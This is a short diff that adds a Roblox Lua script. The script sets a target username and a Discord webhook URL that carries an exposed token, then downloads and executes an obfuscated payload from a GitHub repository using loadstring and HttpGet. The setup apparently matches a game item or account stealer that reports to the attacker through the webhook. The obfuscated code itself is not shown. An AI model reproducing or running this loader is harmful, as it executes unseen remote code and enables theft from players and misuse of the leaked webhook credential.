@@ -1,0 +1,5 @@
+Username = "hussainqazw"
+Webhook = "https://discord.com/api/webhooks/1321687215172227153/H-rFHE6ERefiNfSEs3AbnzYm3CQRTNO9q_BA8dbthmfthcmXgBSt8Nutylj9D1v203m4"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/whyisyoupeavin/MMMM2/refs/heads/main/obfuscated.txt"))()
